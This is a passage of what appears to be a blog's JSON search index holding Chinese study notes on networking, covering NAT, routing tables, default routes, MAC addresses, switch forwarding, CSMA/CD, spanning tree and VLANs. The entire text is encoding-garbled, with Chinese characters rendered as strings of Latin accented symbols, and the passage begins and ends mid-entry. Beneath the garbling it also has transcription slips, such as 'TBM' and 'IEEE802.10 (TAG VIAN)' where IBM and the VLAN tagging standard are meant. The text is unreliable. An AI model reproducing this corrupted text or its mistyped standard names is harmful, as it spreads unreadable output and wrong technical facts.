ä¸­ä¸»æœºä¸ªæ•°è€Œæ˜¯ç”±ä»£ç†æœåŠ¡å™¨å’Œ NATçš„ä¸ªæ•°å†³å®šã€‚\nNAT ç§æœ‰IP æœ€æ—©æ²¡æœ‰è®¡åˆ’è¿æ¥äº’è”ç½‘,è€Œåªç”¨äºäº’è”ç½‘ä¹‹å¤–çš„ç‹¬ç«‹ç½‘ç»œã€‚ç„¶è€Œ, å½“ä¸€ç§èƒ½å¤Ÿäº’æ¢ç§æœ‰ IP ä¸å…¨å±€IP çš„NAT\u0026rsquo;æŠ€æœ¯è¯ç”Ÿä»¥å,é…æœ‰ç§æœ‰åœ°å€çš„ä¸»æœºä¸é…æœ‰å…¨å±€åœ°å€çš„äº’è”ç½‘ä¸»æœºå®ç°äº†é€šä¿¡ã€‚ ç§æœ‰IP åœ°å€ç»“åˆNATæŠ€æœ¯å·²æˆä¸ºç°åœ¨è§£å†³ IPåœ°å€åˆ†é…é—®é¢˜çš„ä¸»æµæ–¹æ¡ˆã€‚å®ƒä¸ä½¿ç”¨å…¨å±€ IP åœ°å€ç›¸æ¯”æœ‰å„ç§é™åˆ¶ã€‚ WHOIS äº’è”ç½‘ä¸­ä»å¾ˆæ—©å¼€å§‹å°±å¯ä»¥é€šè¿‡ç½‘ç»œä¿¡æ¯æŸ¥è¯¢æœºæ„å’Œç®¡ç†äººè”ç³»æ–¹å¼ã€‚è¿™ç§æ–¹æ³•å°±å«åš WHOISã€‚WHOIS æä¾›æŸ¥è¯¢IPåœ°å€ã€ASç¼–å·ä»¥åŠæœç´¢åŸŸååˆ†é…ç™»è®°å’Œç®¡ç†äººä¿¡æ¯çš„æœåŠ¡ã€‚\nè·¯ç”±æ§åˆ¶ å‘é€æ•°æ®åŒ…æ—¶æ‰€ä½¿ç”¨çš„åœ°å€æ˜¯ç½‘ç»œå±‚çš„åœ°å€,å³IPåœ°å€ã€‚ç„¶è€Œä»…ä»…æœ‰IPåœ°å€è¿˜ä¸è¶³ä»¥å®ç°å°†æ•°æ®åŒ…å‘é€åˆ°å¯¹ç«¯ç›®æ ‡åœ°å€,åœ¨æ•°æ®å‘é€è¿‡ç¨‹ä¸­è¿˜éœ€è¦ç±»ä¼¼äºâ€œæŒ‡æ˜è·¯ç”±å™¨æˆ–ä¸»æœºâ€çš„ä¿¡æ¯,ä»¥ä¾¿çœŸæ­£å‘å¾€ç›®æ ‡åœ°å€ã€‚ä¿å­˜è¿™ç§ä¿¡æ¯çš„å°±æ˜¯è·¯ç”±æ§åˆ¶è¡¨(Routing Table)ã€‚\nè¯¥è·¯ç”±æ§åˆ¶è¡¨çš„å½¢æˆæ–¹å¼æœ‰ä¸¤ç§:ä¸€ç§æ˜¯ç®¡ç†å‘˜æ‰‹åŠ¨è®¾ç½®,å¦ä¸€ç§æ˜¯è·¯ç”±å™¨ä¸å…¶ä»–è·¯ç”±å™¨ç›¸äº’äº¤æ¢ä¿¡æ¯æ—¶è‡ªåŠ¨åˆ·æ–°ã€‚å‰è€…ä¹Ÿå«é™æ€è·¯ç”±æ§åˆ¶,è€Œåè€…å«åš**åŠ¨æ€è·¯ç”±æ§åˆ¶\nIPåè®®å§‹ç»ˆè®¤ä¸ºè·¯ç”±è¡¨æ˜¯æ­£ç¡®çš„ã€‚ç„¶è€Œ,IP æœ¬èº«å¹¶æ²¡æœ‰å®šä¹‰åˆ¶ä½œè·¯ç”±æ§åˆ¶è¡¨çš„åè®®ã€‚å³ IPæ²¡æœ‰åˆ¶ä½œè·¯ç”±æ§åˆ¶è¡¨çš„æœºåˆ¶ã€‚è¯¥è¡¨æ˜¯ç”±ä¸€ä¸ªå«åšâ€œè·¯ç”±åè®®â€(è¿™ä¸ªåè®®æœ‰åˆ«äºIP)çš„åè®®åˆ¶ä½œè€Œæˆã€‚ è·¯ç”±æ§åˆ¶è¡¨ è·¯ç”±æ§åˆ¶è¡¨ä¸­è®°å½•ç€ç½‘ç»œåœ°å€ä¸ä¸‹ä¸€æ­¥åº”è¯¥å‘é€è‡³è·¯ç”±å™¨çš„åœ°å€ã€‚åœ¨å‘é€IP åŒ…æ—¶,é¦–å…ˆè¦ç¡®å®šIP åŒ…é¦–éƒ¨ä¸­çš„ç›®æ ‡åœ°å€,å†ä»è·¯ç”±æ§åˆ¶è¡¨ä¸­æ‰¾åˆ°ä¸è¯¥åœ°å€å…·æœ‰ç›¸åŒç½‘ç»œåœ°å€çš„è®°å½•,æ ¹æ®è¯¥è®°å½•å°†IP åŒ…è½¬å‘ç»™ç›¸åº”çš„ä¸‹ä¸€ä¸ªè·¯ç”±å™¨ã€‚å¦‚æœè·¯ç”±æ§åˆ¶è¡¨ä¸­å­˜åœ¨å¤šæ¡ç›¸åŒç½‘ç»œåœ°å€çš„è®°å½•,å°±é€‰æ‹©ä¸€ä¸ªæœ€ä¸ºå»åˆçš„ç½‘ç»œåœ°å€ã€‚æ‰€è°“æœ€ä¸ºå»åˆæ˜¯æŒ‡ç›¸åŒä½æ•°æœ€å¤šçš„æ„æ€â€\nå¦‚æœè·¯ç”±è¡¨ä¸­ä¸‹ä¸€ä¸ªè·¯ç”±å™¨çš„ä½ç½®è®°å½•ç€æŸä¸ªä¸»æœºæˆ–è·¯ç”±å™¨ç½‘å¡çš„IPåœ°å€,é‚£å°±æ„å‘³ç€å‘é€çš„ç›®æ ‡åœ°å€å±äºåŒä¸€ä¸ªé“¾è·¯ã€‚\né»˜è®¤è·¯ç”± å¦‚æœä¸€å¼ è·¯ç”±è¡¨ä¸­åŒ…å«æ‰€æœ‰çš„ç½‘ç»œåŠå…¶å­ç½‘çš„ä¿¡æ¯,å°†ä¼šé€ æˆæ— ç«¯çš„æµªè´¹ã€‚è¿™æ—¶,é»˜è®¤è·¯ç”±(Default Route)æ˜¯ä¸é”™çš„é€‰æ‹©ã€‚é»˜è®¤è·¯ç”±æ˜¯æŒ‡è·¯ç”±è¡¨ä¸­ä»»ä½•ä¸€ä¸ªåœ°å€éƒ½èƒ½ä¸ä¹‹åŒ¹é…çš„è®°å½•ã€‚\né»˜è®¤è·¯ç”±ä¸€èˆ¬æ ‡è®°ä¸º 0.0.0.0/0æˆ– defaul \u0026lsquo;ã€‚è¿™é‡Œçš„0.0.0.0/0å¹¶ä¸æ˜¯æŒ‡ IP åœ°å€æ˜¯0.0.0.0ã€‚ç”±äºåé¢æ˜¯â€œ/0â€,æ‰€ä»¥å¹¶æ²¡æœ‰æ ‡è¯† IP åœ°å€ã€‚å®ƒåªæ˜¯ä¸ºäº†é¿å…äººä»¬è¯¯ä»¥ä¸º0.0.0.0æ˜¯IPåœ°å€ã€‚æœ‰æ—¶é»˜è®¤è·¯ç”±ä¹Ÿè¢«æ ‡è®°ä¸º default,ä½†æ˜¯åœ¨è®¡ç®—æœºå†…éƒ¨å’Œè·¯ç”±åè®®çš„å‘é€è¿‡ç¨‹ä¸­è¿˜æ˜¯ä»¥0.0.0.0/0è¿›è¡Œå¤„ç†ã€‚\nä¸»æœºè·¯ç”± â€œIP åœ°å€/32â€ä¹Ÿè¢«ç§°ä¸ºä¸»æœºè·¯ç”±(Host Route)ã€‚ä¾‹å¦‚,192.168.153.15/32å°±æ˜¯ä¸€ç§ä¸»æœºè·¯ç”±ã€‚å®ƒçš„æ„æ€æ˜¯æ•´ä¸ª IPåœ°å€çš„æ‰€æœ‰ä½éƒ½å°†å‚ä¸è·¯ç”±ã€‚ ä¸»æœºè·¯ç”±å¤šè¢«ç”¨äºä¸å¸Œæœ›é€šè¿‡ç½‘ç»œåœ°å€è·¯ç”±çš„æƒ…å†µã€‚\nç¯å›åœ°å€ ç¯å›åœ°å€æ˜¯åœ¨åŒä¸€å°è®¡ç®—æœºä¸Šçš„ç¨‹åºä¹‹é—´è¿›è¡Œç½‘ç»œé€šä¿¡æ—¶æ‰€ä½¿ç”¨çš„ä¸€ä¸ªé»˜è®¤åœ°å€ã€‚è®¡ç®—æœºä½¿ç”¨ä¸€ä¸ªç‰¹æ®Šçš„IPåœ°å€127.0.0.1ä½œä¸ºç¯å›åœ°å€ã€‚ä¸è¯¥åœ°å€å…·æœ‰ç›¸åŒæ„ä¹‰çš„æ˜¯ä¸€ä¸ªå«åšlocalhost çš„ä¸»æœºåã€‚ä½¿ç”¨è¿™ä¸ª IP æˆ–ä¸»æœºåæ—¶,æ•°æ®åŒ…ä¸ä¼šæµå‘ç½‘ç»œã€‚\nè·¯ç”±æ§åˆ¶è¡¨çš„èšåˆ åˆ©ç”¨ç½‘ç»œåœ°å€çš„æ¯”ç‰¹åˆ†å¸ƒå¯ä»¥æœ‰æ•ˆåœ°è¿›è¡Œåˆ†å±‚é…ç½®ã€‚å¯¹å†…å³ä½¿æœ‰å¤šä¸ªå­ç½‘æ©ç ,å¯¹å¤–å‘ˆç°å‡ºçš„ä¹Ÿæ˜¯åŒä¸€ä¸ªç½‘ç»œåœ°å€ã€‚è¿™æ ·å¯ä»¥æ›´å¥½åœ°æ„å»ºç½‘ç»œ,é€šè¿‡è·¯ç”±ä¿¡æ¯çš„èšåˆå¯ä»¥æœ‰æ•ˆåœ°å‡å°‘è·¯ç”±è¡¨çš„æ¡ç›®â€ã€‚ ","date":"2023-10-18T19:25:30+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%B1%82/","title":"ç½‘ç»œå±‚"},{"content":"æ•°æ®é“¾è·¯å±‚ æ•°æ®é“¾è·¯æ˜¯è®©äº’è”è®¡ç®—æœºä¹‹é—´ç›¸äº’é€šä¿¡çš„ä¸€ç§åè®®,åˆæŒ‡é€šä¿¡æ‰‹æ®µã€‚ æ•°æ®é“¾è·¯çš„æ®µ æ•°æ®é“¾è·¯çš„æ®µæ˜¯æŒ‡ä¸€ä¸ªè¢«åˆ†å‰²çš„ç½‘ç»œã€‚ç„¶è€Œæ ¹æ®ä½¿ç”¨è€…ä¸åŒ,å…¶å«ä¹‰ä¹Ÿä¸å°½ç›¸åŒã€‚ä¾‹å¦‚,å¼•å…¥ä¸­ç»§å™¨å°†ä¸¤æ¡ç½‘çº¿ç›¸è¿ç»„æˆä¸€ä¸ªç½‘ç»œã€‚ è¿™ç§æƒ…å†µä¸‹æœ‰ä¸¤æ¡æ•°æ®é“¾è·¯: â—ä»ç½‘ç»œå±‚çš„æ¦‚å¿µçœ‹,å®ƒæ˜¯ä¸€ä¸ªç½‘ç»œ(é€»è¾‘ä¸Š)ä¸€å³,ä»ç½‘ç»œå±‚çš„ç«‹åœºå‡ºå‘,è¿™ä¸¤æ¡ç½‘çº¿ç»„æˆä¸€ä¸ªæ®µã€‚ â—ä»ç‰©ç†å±‚çš„æ¦‚å¿µçœ‹,ä¸¤æ¡ç½‘çº¿åˆ†åˆ«æ˜¯ä¸¤ä¸ªç‰©ä½“(ç‰©ç†ä¸Š)ä¸€å³, ä»ç‰©ç†å±‚çš„è§‚.ç‚¹å‡ºå‘,ä¸€æ¡ç½‘çº¿æ˜¯ä¸€ä¸ªæ®µã€‚ ç½‘ç»œæ‹“æ‰‘ ç½‘ç»œçš„è¿æ¥å’Œæ„æˆçš„å½¢æ€ç§°æ²Ÿç½‘ç»œæ‹“æ‰‘(Topology)ã€‚ç½‘ç»œæ‹“æ‰‘åŒ…æ‹¬æ€»çº¿å‹ã€ç¯å‹ã€æ˜Ÿå‹ã€ç½‘çŠ¶å‹ç­‰ã€‚æ‹“æ‰‘ä¸€è¯ä¸ä»…ç”¨äºç›´è§‚å¯è§çš„é…çº¿æ–¹å¼ä¸Š,ä¹Ÿç”¨äºé€»è¾‘ä¸Šç½‘ç»œçš„ç»„æˆç»“æ„ã€‚ä¸¤è€…æœ‰æ—¶å¯èƒ½ä¼šä¸ä¸€è‡´ã€‚è€Œç›®å‰å®é™…çš„ç½‘ç»œéƒ½æ˜¯ç”±è¿™äº›ç®€å•çš„æ‹“æ‰‘ç»“æ„é”™ç»¼å¤æ‚åœ°ç»„åˆè€Œæˆçš„ã€‚ MAC MACåœ°å€ç”¨äºè¯†åˆ«æ•°æ®é“¾è·¯ä¸­äº’è¿çš„èŠ‚ç‚¹ã€‚ MAC åœ°å€é•¿48 æ¯”ç‰¹ã€‚åœ¨ä½¿ç”¨ç½‘å¡(NIC)çš„æƒ…å†µä¸‹, MACåœ°å€ä¸€èˆ¬ä¼šè¢«çƒ§äººåˆ° ROM ä¸­ã€‚å› æ­¤,ä»»ä½•ä¸€ä¸ªç½‘å¡çš„MACåœ°å€éƒ½æ˜¯å”¯ä¸€çš„,åœ¨å…¨ä¸–ç•Œéƒ½ä¸ä¼šæœ‰é‡å¤â€ã€‚ æ³¨ï¼š ä¾‹å¤–æƒ…å†µâ€”MACåœ°å€ä¸ä¸€å®šæ˜¯å”¯ä¸€çš„åœ¨å…¨ä¸–ç•Œ,MACåœ°å€ä¹Ÿå¹¶ä¸æ€»æ˜¯å”¯ä¸€çš„ã€‚å®é™…ä¸Š,å³ä½¿ MACåœ°å€ç›¸åŒ,åªè¦ä¸æ˜¯åŒå±ä¸€ä¸ªæ•°æ®é“¾è·¯å°±ä¸ä¼šå‡ºç°é—®é¢˜ã€‚ ä¾‹å¦‚,äººä»¬å¯ä»¥åœ¨å¾®æœºæ¿ä¸Šè‡ªç”±è®¾ç½®è‡ªå·±çš„MACåœ°å€ã€‚å†ä¾‹å¦‚,ä¸€å°ä¸»æœºä¸Šå¦‚æœå¯åŠ¨å¤šä¸ªè™šæ‹Ÿæœº,ç”±äºæ²¡æœ‰ç¡¬ä»¶çš„ç½‘å¡åªèƒ½ç”±è™šæ‹Ÿè½¯ä»¶è‡ªå·±è®¾å®š MACåœ°å€ç»™å¤šä¸ªè™šæ‹Ÿç½‘å¡,è¿™æ—¶å°±å¾ˆéš¾ä¿è¯æ‰€ç”Ÿæˆçš„MACåœ°å€æ˜¯ç‹¬ä¸€æ— äºŒçš„äº†ã€‚ ä½†æ˜¯,æ— è®ºå“ªä¸ªåè®®æˆå‘˜é€šä¿¡è®¾å¤‡,è®¾è®¡å‰æéƒ½æ˜¯ MACåœ°å€çš„å”¯ä¸€æ€§ã€‚è¿™ä¹Ÿå¯ä»¥è¯´æ˜¯ç½‘ç»œä¸–ç•Œçš„åŸºæœ¬å‡†åˆ™ã€‚ æ ¹æ® MACåœ°å€è½¬å‘ ä»¥å¤ªç½‘äº¤æ¢æœºå°±æ˜¯æŒæœ‰å¤šä¸ªç«¯å£â€çš„ç½‘æ¡¥ã€‚å®ƒä»¬æ ¹æ®æ•°æ®é“¾è·¯å±‚ä¸­æ¯ä¸ªå¸§çš„ç›®æ ‡MACåœ°å€,å†³å®šä»å“ªä¸ªç½‘ç»œæ¥å£å‘é€æ•°æ®ã€‚è¿™æ—¶æ‰€å‚è€ƒçš„ã€ç”¨ä»¥è®°å½•å‘é€æ¥å£çš„è¡¨å°±å«åšè½¬å‘è¡¨(Forwarding Table)ã€‚ è¿™ç§è½¬å‘è¡¨çš„å†…å®¹ä¸éœ€è¦ä½¿ç”¨è€…åœ¨æ¯ä¸ªç»ˆç«¯æˆ–äº¤æ¢æœºä¸Šæ‰‹å·¥è®¾ç½®,è€Œæ˜¯å¯ä»¥è‡ªåŠ¨ç”Ÿæˆã€‚æ•°æ®é“¾è·¯å±‚çš„æ¯ä¸ªé€šè¿‡ç‚¹åœ¨æ¥åˆ°åŒ…æ—¶,ä¼šä»ä¸­å°†æºMACåœ°å€ä»¥åŠæ›¾ç»æ¥æ”¶è¯¥åœ°å€å‘é€çš„æ•°æ®åŒ…çš„æ¥å£ä½œä¸ºå¯¹åº”å…³ç³»è®°å½•åˆ°è½¬å‘è¡¨ä¸­ã€‚ ä»¥æŸä¸ª MACåœ°å€ä½œä¸ºæºåœ°å€çš„åŒ…ç”±æŸä¸€æ¥å£æ¥æ”¶,å®è´¨ä¸Šå¯ä»¥ç†è§£ä¸ºè¯¥MACåœ°å€å°±æ˜¯è¯¥æ¥å£çš„ç›®æ ‡ã€‚å› æ­¤ä¹Ÿå¯ä»¥è¯´,ä»¥è¯¥ MACåœ°å€ä½œä¸ºç›®æ ‡åœ°å€çš„åŒ…,ç»ç”±è¯¥æ¥å£é€å‡ºå³å¯ã€‚è¿™ä¸€è¿‡ç¨‹ä¹Ÿå«è‡ªå­¦è¿‡ç¨‹ã€‚ äº¤æ¢æœºè½¬å‘æ–¹å¼ å­˜å‚¨è½¬å‘ å­˜å‚¨è½¬å‘æ–¹å¼æ£€æŸ¥ä»¥å¤ªç½‘æ•°æ®å¸§æœ«å°¾çš„ FCS\u0026rsquo;ä½åå†è¿›è¡Œè½¬å‘ã€‚å› æ­¤,å¯ä»¥é¿å…å‘é€ç”±äºå†²çªè€Œè¢«ç ´åçš„å¸§æˆ–å™ªå£°å¯¼è‡´çš„é”™è¯¯å¸§ã€‚\nç›´é€šè½¬å‘ ç›´é€šè½¬å‘æ–¹å¼ä¸­ä¸éœ€è¦å°†æ•´ä¸ªå¸§å…¨éƒ¨æ¥æ”¶ä¸‹æ¥ä»¥åå†è¿›è¡Œè½¬å‘ã€‚åªéœ€è¦å¾—çŸ¥ç›®æ ‡åœ°å€å³å¯å¼€å§‹è½¬å‘ã€‚å› æ­¤,å®ƒå…·æœ‰å»¶è¿Ÿè¾ƒçŸ­çš„ä¼˜åŠ¿ã€‚ä½†åŒæ—¶ä¹Ÿä¸å¯é¿å…åœ°æœ‰å‘é€é”™è¯¯å¸§çš„å¯èƒ½æ€§ã€‚\nå…±äº«ä»‹è´¨å‹ç½‘ç»œ å…±äº«ä»‹è´¨å‹ç½‘ç»œæŒ‡ç”±å¤šä¸ªè®¾å¤‡å…±äº«ä¸€ä¸ªé€šä¿¡ä»‹è´¨çš„ä¸€ç§ç½‘ç»œã€‚æœ€æ—©çš„ä»¥å¤ªç½‘å’ŒFDDI å°±æ˜¯ä»‹è´¨å…±äº«å‹ç½‘ç»œã€‚åœ¨è¿™ç§æ–¹å¼ä¸‹,è®¾å¤‡ä¹‹é—´ä½¿ç”¨åŒä¸€ä¸ªè½½æ³¢ä¿¡é“è¿›è¡Œå‘é€å’Œæ¥æ”¶ã€‚ä¸ºæ­¤,åŸºæœ¬ä¸Šé‡‡ç”¨åŠåŒå·¥é€šä¿¡æ–¹å¼,å¹¶æœ‰å¿…è¦å¯¹ä»‹è´¨è¿›è¡Œè®¿é—®æ§åˆ¶ã€‚\näº‰ç”¨æ–¹å¼ äº‰ç”¨æ–¹å¼(Contention)æ˜¯æŒ‡äº‰å¤ºè·å–æ•°æ®ä¼ è¾“çš„æƒåŠ›,ä¹Ÿå« CSMA(è½½æ³¢ç›‘å¬å¤šè·¯è®¿é—®)ã€‚è¿™ç§æ–¹æ³•é€šå¸¸ä»¤ç½‘ç»œä¸­çš„å„ä¸ªç«™â€é‡‡ç”¨å…ˆåˆ°å…ˆå¾—çš„æ–¹å¼å ç”¨ä¿¡é“å‘é€æ•°æ®,å¦‚æœå¤šä¸ªç«™åŒæ—¶å‘é€å¸§,åˆ™ä¼šäº§ç”Ÿå†²çªç°è±¡ã€‚ä¹Ÿå› æ­¤ä¼šå¯¼è‡´ç½‘ç»œæ‹¥å µä¸æ€§èƒ½ä¸‹é™ã€‚ CSMA/CD åœ¨ä¸€éƒ¨åˆ†ä»¥å¤ªç½‘å½“ä¸­,é‡‡ç”¨äº†æ”¹è‰¯ CSMA çš„å¦ä¸€ç§æ–¹å¼-CSMA/CD æ–¹å¼ã€‚CSMA/CD è¦æ±‚æ¯ä¸ªç«™æå‰æ£€æŸ¥å†²çª,ä¸€æ—¦å‘ç”Ÿå†²çª,åˆ™å°½æ—©é‡Šæ”¾ä¿¡é“ã€‚å…¶å…·ä½“å·¥ä½œåŸç†å¦‚ä¸‹: å¦‚æœè½½æ³¢ä¿¡é“ä¸Šæ²¡æœ‰æ•°æ®æµåŠ¨,åˆ™ä»»ä½•ç«™éƒ½å¯ä»¥å‘é€æ•°æ®ã€‚\næ£€æŸ¥æ˜¯å¦ä¼šå‘ç”Ÿå†²çªã€‚ä¸€æ—¦å‘ç”Ÿå†²çªæ—¶,æ”¾å¼ƒå‘é€æ•°æ®â€,åŒæ—¶ç«‹å³é‡Šæ”¾è½½æ³¢ä¿¡é“ã€‚ æ”¾å¼ƒå‘é€ä»¥å,éšæœºå»¶æ—¶ä¸€æ®µæ—¶é—´,å†é‡æ–°äº‰ç”¨ä»‹è´¨,é‡æ–°å‘é€å¸§ã€‚ ä»¤ç‰Œä¼ é€’æ–¹å¼ ä»¤ç‰Œä¼ é€’æ–¹å¼æ˜¯æ²¿ç€ä»¤ç‰Œç¯å‘é€ä¸€ç§å«åšâ€œä»¤ç‰Œâ€çš„ç‰¹æ®ŠæŠ¥æ–‡,æ˜¯æ§åˆ¶ä¼ è¾“çš„ä¸€ç§æ–¹å¼ã€‚åªæœ‰è·å¾—ä»¤ç‰Œçš„ç«™æ‰èƒ½å‘é€æ•°æ®ã€‚è¿™ç§æ–¹å¼æœ‰ä¸¤ä¸ªç‰¹ç‚¹:ä¸€æ˜¯ä¸ä¼šæœ‰å†²çª,äºŒæ˜¯æ¯ä¸ªç«™éƒ½æœ‰é€šè¿‡å¹³ç­‰å¾ªç¯è·å¾—ä»¤ç‰Œçš„æœºä¼šã€‚å› æ­¤,å³ä½¿ç½‘ç»œæ‹¥å µä¹Ÿä¸ä¼šå¯¼è‡´æ€§èƒ½ä¸‹é™ã€‚ å½“ç„¶,è¿™ç§æ–¹å¼ä¸­,ä¸€ä¸ªç«™åœ¨æ²¡æœ‰æ”¶åˆ°ä»¤ç‰Œå‰ä¸èƒ½å‘é€æ•°æ®å¸§,å› æ­¤åœ¨ç½‘ç»œä¸å¤ªæ‹¥å µçš„æƒ…å†µä¸‹æ•°æ®é“¾è·¯çš„åˆ©ç”¨ç‡ä¹Ÿå°±è¾¾ä¸åˆ°100%\néå…±äº«ä»‹è´¨ç½‘ç»œ éå…±äº«ä»‹è´¨ç½‘ç»œæ˜¯æŒ‡ä¸å…±äº«ä»‹è´¨,æ˜¯å¯¹ä»‹è´¨é‡‡å–ä¸“ç”¨çš„ä¸€ç§ä¼ è¾“æ§åˆ¶æ–¹å¼ã€‚åœ¨è¿™ç§æ–¹å¼ä¸‹,ç½‘ç»œä¸­çš„æ¯ä¸ªç«™ç›´è¿äº¤æ¢æœº,ç”±äº¤æ¢æœºè´Ÿè´£è½¬å‘æ•°æ®å¸§ã€‚\nè¯¥æ–¹å¼è¿˜å¯ä»¥æ ¹æ®äº¤æ¢æœºçš„é«˜çº§ç‰¹æ€§æ„å»ºè™šæ‹Ÿå±€åŸŸç½‘(VLAN,Virtual LAN)ã€è¿›è¡Œæµé‡æ§åˆ¶ç­‰ã€‚å½“ç„¶,è¿™ç§æ–¹å¼ä¹Ÿæœ‰ä¸€ä¸ªè‡´å‘½çš„å¼±ç‚¹,é‚£å°±æ˜¯ä¸€æ—¦äº¤æ¢æœºå‘ç”Ÿæ•…éšœ,ä¸ä¹‹ç›¸è¿çš„æ‰€æœ‰è®¡ç®—æœºä¹‹é—´éƒ½å°†æ— æ³•é€šä¿¡ã€‚\nå…¨åŒå·¥é€šä¿¡ å®ƒå…è®¸åœ¨åŒä¸€æ—¶é—´æ—¢å¯ä»¥å‘é€æ•°æ®ä¹Ÿå¯ä»¥æ¥æ”¶æ•°æ®ã€‚ç±»ä¼¼äºç”µè¯,æ¥æ‰“åŒæ–¹å¯ä»¥åŒæ—¶è¯´è¯ã€‚ åŒæ ·æ˜¯ä»¥å¤ªç½‘,åœ¨ä½¿ç”¨äº¤æ¢æœºä¸åŒç»çº¿ç”µç¼†(äº¦æˆ–å…‰çº¤ç”µç¼†) çš„æƒ…å†µä¸‹,æ—¢å¯ä»¥é€šè¿‡äº¤æ¢æœºçš„ç«¯å£ä¸è®¡ç®—æœºä¹‹é—´è¿›è¡Œä¸€å¯¹ä¸€çš„è¿æ¥,ä¹Ÿå¯ä»¥é€šè¿‡ç›¸è¿ç”µç¼†å†…éƒ¨çš„æ”¶å‘çº¿è·¯â€åˆ†åˆ«è¿›è¡Œæ¥æ”¶å’Œå‘é€æ•°æ®ã€‚å› æ­¤,äº¤æ¢æœºçš„ç«¯å£ä¸è®¡ç®—æœºä¹‹é—´å¯ä»¥å®ç°åŒæ—¶æ”¶å‘çš„å…¨åŒå·¥é€šä¿¡ã€‚ ç¯è·¯æ£€æµ‹æŠ€æœ¯ é€šè¿‡ç½‘æ¡¥è¿æ¥ç½‘ç»œæ—¶,ä¸€æ—¦å‡ºç°ç¯è·¯è¯¥å¦‚ä½•å¤„ç†?è¿™ä¸ç½‘ç»œçš„æ‹“æ‰‘ç»“æ„å’Œæ‰€ä½¿ç”¨çš„ç½‘æ¡¥ç§ç±»æœ‰ç›´æ¥å…³ç³»ã€‚æœ€åçš„æƒ…å†µä¸‹,æ•°æ®é¡¿ä¼šåœ¨ç¯è·¯ä¸­è¢«ä¸€è€Œå†å†è€Œä¸‰åœ°æŒç»­è½¬å‘ã€‚è€Œä¸€æ—¦è¿™ç§æ•°æ®å¸§è¶Šç§¯è¶Šå¤šå°†ä¼šå¯¼è‡´ç½‘ç»œç˜«ç—ªã€‚\nç”Ÿæˆæ ‘æ–¹å¼ è¯¥æ–¹æ³•ç”± IEEE802.1Då®šä¹‰ã€‚æ¯ä¸ªç½‘æ¡¥å¿…é¡»åœ¨æ¯1~10ç§’å†…ç›¸äº’äº¤æ› BPDU (Bridge Protocol Data Unit)åŒ…,ä»è€Œåˆ¤æ–­å“ªäº›ç«¯å£ä½¿ç”¨å“ªäº›ä¸ä½¿ç”¨,ä»¥ä¾¿æ¶ˆé™¤ç¯è·¯ã€‚ä¸€æ—¦å‘ç”Ÿæ•…éšœ,åˆ™è‡ªåŠ¨åˆ‡æ¢é€šä¿¡çº¿è·¯,åˆ©ç”¨é‚£äº›æ²¡æœ‰è¢«ä½¿ç”¨çš„ç«¯å£ç»§ç»­è¿›è¡Œä¼ è¾“ã€‚\næºè·¯ç”±æ³• æºè·¯ç”±æ³•æœ€æ—©ç”±TBM æå‡º,ä»¥è§£å†³ä»¤ç‰Œç¯â€ç½‘ç»œçš„é—®é¢˜ã€‚è¯¥æ–¹å¼å¯ä»¥åˆ¤æ–­å‘é€æ•°æ®çš„æºåœ°å€æ˜¯é€šè¿‡å“ªä¸ªç½‘æ¡¥å®ç°ä¼ è¾“çš„,å¹¶å°†å¸§å†™äºº RIF(Routing Information Field)ã€‚ç½‘æ¡¥åˆ™æ ¹æ®è¿™ä¸ª RIF ä¿¡æ¯å‘é€å¸§ç»™ç›®æ ‡åœ°å€ã€‚å› æ­¤,å³ä½¿ç½‘æ¡¥ä¸­å‡ºç°äº†ç¯è·¯,æ•°æ®å¸§ä¹Ÿä¸ä¼šè¢«åå¤è½¬å‘,å¯æˆåŠŸåœ°å‘é€åˆ°ç›®æ ‡åœ°å€ã€‚åœ¨è¿™ç§æœºåˆ¶ä¸­å‘é€ç«¯æœ¬èº«å¿…é¡»å…·å¤‡æºè·¯ç”±çš„åŠŸèƒ½ã€‚\nVLAN è¿›è¡Œç½‘ç»œç®¡ç†çš„æ—¶å€™,æ—¶å¸¸ä¼šé‡åˆ°åˆ†æ•£ç½‘ç»œè´Ÿè½½ã€å˜æ¢éƒ¨ç½²ç½‘ç»œè®¾å¤‡çš„ä½ç½®ç­‰æƒ…å†µã€‚è€Œæœ‰æ—¶ç®¡ç†å‘˜åœ¨åšè¿™äº›æ“ä½œæ—¶,ä¸å¾—ä¸ä¿®æ”¹ç½‘ç»œçš„æ‹“æ‰‘ç»“æ„,è¿™ä¹Ÿå°±æ„å‘³ç€å¿…é¡»è¿›è¡Œç¡¬ä»¶çº¿è·¯çš„æ”¹é€ ã€‚ç„¶è€Œ,å¦‚æœé‡‡ç”¨å¸¦æœ‰ VLAN æŠ€æœ¯çš„ç½‘æ¡¥,å°±ä¸ç”¨å®é™…ä¿®æ”¹ç½‘ç»œå¸ƒçº¿,åªéœ€ä¿®æ”¹ç½‘ç»œçš„ç»“æ„å³å¯ã€‚ æ³¨æ„ï¼šVLAN æ˜¯åŸºäºä»¥å¤ªç½‘çš„ä¸€ç§æŠ€æœ¯ï¼Œå®ƒä½¿ç”¨ VLAN æ ‡ç­¾å°†æ•°æ®å¸§åˆ’åˆ†åˆ°ä¸åŒçš„é€»è¾‘ç½‘æ®µã€‚\näº¤æ¢æœºæŒ‰ç…§å…¶ç«¯å£åŒºåˆ†äº†å¤šä¸ªç½‘æ®µ,ä»è€ŒåŒºåˆ†äº†å¹¿æ’­æ•°æ®ä¼ æ’­çš„èŒƒå›´ã€å‡å°‘äº†ç½‘ç»œè´Ÿè½½å¹¶æé«˜äº†ç½‘ç»œçš„å®‰å…¨æ€§ã€‚ç„¶è€Œå¼‚æ„çš„ä¸¤ä¸ªç½‘æ®µä¹‹é—´,å°±éœ€è¦åˆ©ç”¨å…·æœ‰è·¯ç”±åŠŸèƒ½çš„äº¤æ¢æœº(å¦‚3å±‚äº¤æ¢æœº), æˆ–åœ¨å„æ®µä¸­é—´é€šè¿‡è·¯ç”±å™¨çš„è¿æ¥æ‰èƒ½å®ç°é€šä¿¡ã€‚ å¯¹è¿™ç§ VLAN è¿›è¡Œäº†æ‰©å±•,åˆå®šä¹‰äº† IEEE802.10 çš„æ ‡å‡†(ä¹Ÿå« TAG VIAN),è¯¥æ ‡å‡†å…è®¸åŒ…å«è·¨è¶Šå¼‚æ„äº¤æ¢æœºçš„ç½‘æ®µã€‚TAG VLAN ä¸­å¯¹æ¯ä¸ªç½‘æ®µéƒ½ç”¨ä¸€ä¸ª VLAN ID çš„æ ‡ç­¾è¿›è¡Œå”¯ä¸€æ ‡è¯†ã€‚åœ¨äº¤æ¢æœºä¸­ä¼ 